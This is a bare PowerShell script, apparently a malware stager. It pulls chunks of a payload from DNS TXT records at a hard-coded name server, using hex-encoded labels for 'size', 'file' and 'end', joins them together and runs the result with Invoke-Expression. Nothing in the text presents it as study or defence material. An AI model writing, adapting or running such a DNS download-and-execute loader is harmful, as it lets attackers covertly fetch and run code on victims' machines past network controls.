$index = 0
$size = 255
$file_size = $(Resolve-DnsName -Server '54.156.28.185' -Name "73697a65.koratxt.com" -Type TXT).Strings
$x = ''
foreach ($i in 1..[int]"$file_size") {
    $x += $(Resolve-DnsName -Server '54.156.28.185' -Name "66696c65.$index.koratxt.com" -Type TXT).Strings
    $index += $size
}
$(Resolve-DnsName -Server $server -Name "656e64.koratxt.com" -Type TXT)
iex $x